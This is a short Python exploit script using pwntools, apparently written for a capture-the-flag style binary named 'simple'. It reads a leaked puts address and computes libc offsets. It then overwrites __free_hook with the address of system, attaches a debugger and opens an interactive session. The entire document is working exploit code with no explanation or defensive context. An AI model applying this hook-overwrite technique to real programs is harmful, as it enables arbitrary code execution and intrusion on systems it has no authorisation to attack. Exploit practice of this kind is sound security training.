from pwn import *

r = process('./simple')

puts_addr = int(r.recvline().split(b' @ ')[1], 16)
print(f'puts_addr @ {hex(puts_addr)}')

freehook_addr = puts_addr + 0x167588
system_addr = puts_addr - 0x32190

gdb.attach(r, 'b system\nc')
r.sendlineafter('addr:', hex(freehook_addr))
r.sendlineafter('val:', hex(system_addr)[2:].rjust(1024, '0'))


r.interactive()
